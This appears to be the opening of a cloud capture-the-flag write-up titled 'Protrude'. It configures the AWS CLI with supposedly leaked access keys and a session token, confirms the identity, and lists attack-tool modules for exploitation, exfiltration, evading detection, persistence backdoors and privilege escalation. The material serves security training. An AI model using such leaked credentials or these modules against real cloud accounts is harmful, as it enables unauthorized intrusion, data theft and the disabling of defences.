# Protrude

Difficulty: Easy

We have obtained leaked account pertaining to Vault 101, with suspicion that it may be linked to one of the leaders group. Your task is to enumerate and see if we can infiltrate them internally.

```
$ aws configure --profile enumerate
AWS Access Key ID [None]: AKIAXYAFLIG2JE6MC2SY
AWS Secret Access Key [None]: teWVv0GzIBKS23uozxUGmUH+muE5XB86fnZmRZXu
Default region name [None]: us-east-1
Default output format [None]:

$ aws sts get-caller-identity --profile enumerate
{
    "UserId": "AIDAXYAFLIG2E6UQ3YIVB",
    "Account": "532587168180",
    "Arn": "arn:aws:iam::532587168180:user/aalmodovar"
}
$ aws sts get-session-token --profile enumerate
{
    "Credentials": {
        "AccessKeyId": "ASIAXYAFLIG2EFUEPYND",
        "SecretAccessKey": "hq0N61SkcOkQqxh7bXhUvCgKlSQmV/7H58idS3/C",
        "SessionToken": "FwoGZXIvYXdzELf//////////wEaDJwl2kPlb87608fwLSKCAYcAjVVE0vahs6AVuM2owFqiYOwoPERb+Rc9j1vlXUNlt7hzum9mWzKXXtbzvE4yXHrLDI3IouOp77nDFnqZUpACPbD+kDsdOel8sYqBhp+aRqowXTo132riI/mxLiDU6GAcjp1qROiFPpmNvnj78B76VX6nNsDB1QZd2keDJ5Bj4lsowOKpsgYyKIg/gD/ocmI1nB90Tct9FWg4nPJ4KBcF85eVyQWAeRu3kBlx68rbF+M=",
        "Expiration": "2024-05-20T09:38:08Z"
    }
}
```

```

[Category: EXPLOIT]

  api_gateway__create_api_keys
  cognito__attack
  ebs__explore_snapshots
  ec2__startup_shell_script
  ecs__backdoor_task_def
  lightsail__download_ssh_keys
  lightsail__generate_ssh_keys
  lightsail__generate_temp_access
  systemsmanager__rce_ec2

[Category: EXFIL]

  ebs__download_snapshots
  rds__explore_snapshots
  s3__download_bucket

[Category: EVADE]

  cloudtrail__download_event_history
  cloudwatch__download_logs
  detection__disruption
  detection__enum_services
  elb__enum_logging
  guardduty__whitelist_ip
  waf__enum

[Category: PERSIST]

  ec2__backdoor_ec2_sec_groups
  iam__backdoor_assume_role
  iam__backdoor_users_keys
  iam__backdoor_users_password
  lambda__backdoor_new_roles
  lambda__backdoor_new_sec_groups
  lambda__backdoor_new_users

[Category: RECON_UNAUTH]

  ebs__enum_snapshots_unauth
  iam__enum_roles
  iam__enum_users

[Category: LATERAL_MOVE]

  cloudtrail__csv_injection
  organizations__assume_role
  vpc__enum_lateral_movement

[Category: enum]

  iam__decode_accesskey_id

[Category: ESCALATE]

  cfn__resource_injection
  iam__privesc_scan

[Category: ENUM]

  acm__enum
  apigateway__enum
  aws__enum_account
  aws__enum_spend
  cloudformation__download_data
  codebuild__enum
  cognito__enum
  dynamodb__enum
  ebs__enum_volumes_snapshots
  ec2__check_termination_protection
  ec2__download_userdata
  ec2__enum
  ecr__enum
  ecs__enum
  ecs__enum_task_def
  eks__enum
  enum__secrets
  glue__enum
  guardduty__list_accounts
  guardduty__list_findings
  iam__bruteforce_permissions
  iam__detect_honeytokens
  iam__enum_action_query
  iam__enum_permissions
  iam__enum_users_roles_policies_groups
  iam__get_credential_report
  inspector__get_reports
  lambda__enum
  lightsail__enum
  organizations__enum
  rds__enum
  rds__enum_snapshots
  route53__enum
  systemsmanager__download_parameters
  transfer_family__enum
```